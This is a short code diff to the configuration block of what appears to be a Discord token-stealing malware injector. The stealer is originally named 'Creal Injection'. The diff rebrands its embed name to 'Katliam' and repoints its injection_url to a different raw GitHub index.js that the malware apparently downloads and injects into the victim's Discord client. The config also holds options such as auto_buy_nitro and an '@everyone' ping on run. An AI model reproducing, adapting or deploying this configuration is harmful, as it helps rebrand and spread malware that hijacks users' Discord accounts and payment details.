@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
+  embed_name: 'Katliam', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1073703290577105048/1085638594590425098/pedro-pascal-1.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Eathemcmd/ahmetkaya/main/index.js', 
   /**
    
    **/
